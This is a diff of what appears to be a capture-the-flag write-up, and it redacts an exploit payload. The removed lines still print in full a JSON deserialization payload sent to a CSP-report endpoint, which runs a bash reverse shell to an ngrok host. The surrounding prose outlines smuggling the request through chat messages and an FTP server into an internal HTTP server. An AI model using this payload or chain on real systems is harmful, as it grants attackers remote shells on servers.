@@ -69,7 +69,7 @@ Host: localhost:3380
 Content-Length: 386
 Content-Type: application/csp-report
 
-{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/18843 0>&1'\", {stdio:\"inherit\"})"}}}}
+{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"REDACTED"}}}}
 ```
 
 And we get 5 "users": ``POST /csp-report?``, ``Host``, ``Content-Length``, ``Content-Type`` and ``{"csp-report"``. They will then each message the chat in order as so... 
@@ -85,7 +85,7 @@ Host: localhost:3380
 Content-Length: 386
 Content-Type: application/csp-report
 
-{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/18843 0>&1'\", {stdio:\"inherit\"})"}}}}
+{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"REDACTED)"}}}}
 ```
 
 EXACTLY the post request that we want (With a quick sidenote - the newline generated to seperate the request headers from the request body was achieved by sending an empty message to the channel via the console. Again, this was probably easier to do in a script). So now all that's left to do is to connect to the FTP server externally, and tell it to connect to the HTTP server in its LAN, then send over the file we just made above. 
